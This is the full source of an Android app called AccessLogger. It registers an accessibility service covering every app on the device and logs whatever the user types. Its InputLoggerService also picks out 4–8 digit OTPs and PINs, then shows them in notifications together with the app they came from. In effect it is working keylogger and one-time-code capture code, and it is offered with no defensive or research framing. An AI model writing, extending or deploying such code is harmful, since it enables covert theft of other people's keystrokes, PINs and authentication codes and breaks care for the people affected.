# <manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.accesslogger">

    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>

    <application
        android:allowBackup="true"
        android:label="AccessLogger"
        android:supportsRtl="true"
        android:theme="@style/Theme.AppCompat.Light.NoActionBar">

        <service
            android:name=".logger.InputLoggerService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config" />
        </service>

    </application>
</manifest>


---

2. res/xml/accessibility_config.xml

<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeViewTextChanged|typeViewFocused|typeViewClicked"
    android:packageNames=""
    android:accessibilityFeedbackType="feedbackSpoken"
    android:notificationTimeout="100"
    android:canRetrieveWindowContent="true"
    android:description="@string/app_name"
    android:settingsActivity=""
    android:accessibilityFlags="flagDefault" />


---

3. InputLoggerService.java

package com.example.accesslogger.logger;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.util.Log;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.os.Build;
import androidx.core.app.NotificationCompat;
import android.content.Context;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class InputLoggerService extends AccessibilityService {

    private static final String TAG = "ACCESS_LOG";
    private static final String CHANNEL_ID = "otp_channel";
    private Pattern otpPattern = Pattern.compile("\\b\\d{4,8}\\b"); // 4-8 digit OTP/PIN

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        String packageName = (event.getPackageName() != null) 
                ? event.getPackageName().toString() 
                : "UnknownApp";

        String text = (event.getText() != null) ? event.getText().toString() : "";

        // OTP/PIN শনাক্তকরণ
        Matcher matcher = otpPattern.matcher(text);
        if (matcher.find()) {
            String otp = matcher.group();
            Log.i(TAG, "OTP/PIN detected: " + otp + " | App: " + packageName);
            showNotification("OTP Detected", "App: " + packageName + " | Code: " + otp);
        } else if (!text.isEmpty()) {
            Log.i(TAG, "Text Input: " + text + " | App: " + packageName);
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            Log.i(TAG, "Button Clicked in App: " + packageName);
        }
    }

    private void showNotification(String title, String content) {
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "OTP Notifications", NotificationManager.IMPORTANCE_HIGH);
            manager.createNotificationChannel(channel);
        }

        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(content)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true);

        manager.notify((int) System.currentTimeMillis(), builder.build());
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Service interrupted");
    }
}


---

4. MainActivity.java

package com.example.accesslogger;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }
}


---

5. res/layout/activity_main.xml

<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:orientation="vertical">

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Accessibility Logger Active"
        android:textSize="18sp"/>
</LinearLayout>


---

6. res/values/strings.xml

<resources>
    <string name="app_name">AccessLogger</string>
</resources>


---

7. build.gradle (Module)

plugins {
    id 'com.android.application'
}

android {
    compileSdkVersion 34

    defaultConfig {
        applicationId "com.example.accesslogger"
        minSdkVersion 24
        targetSdkVersion 34
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.core:core:1.12.0'
}gh-app-spike-test